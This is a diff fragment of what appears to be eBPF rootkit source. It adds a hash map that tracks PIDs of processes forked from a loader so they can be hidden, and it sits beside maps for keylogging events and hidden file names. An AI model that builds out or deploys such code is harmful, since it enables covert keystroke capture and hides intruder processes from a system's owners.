@@ -47,6 +47,22 @@ struct {
 } keylog_events SEC(".maps");
 
 /**
+ * @brief Map to store target PIDs to hide.
+ * 
+ * This map is tracking all PIDs of process forked from loader.
+ *
+ * Key: pid_t PID
+ * Value: u8 Flag (1 = forked)
+ *
+ */
+struct {
+    __uint(type, BPF_MAP_TYPE_HASH);
+    __uint(max_entries, HIDE_NAMES_MAP_MAX_ENTRIES);
+    __type(key, pid_t);
+    __type(value, u8);
+} tracked_pids_map SEC(".maps");
+
+/**
  * @brief Map to store target file names to hide.
  *
  * Key: char[] filename
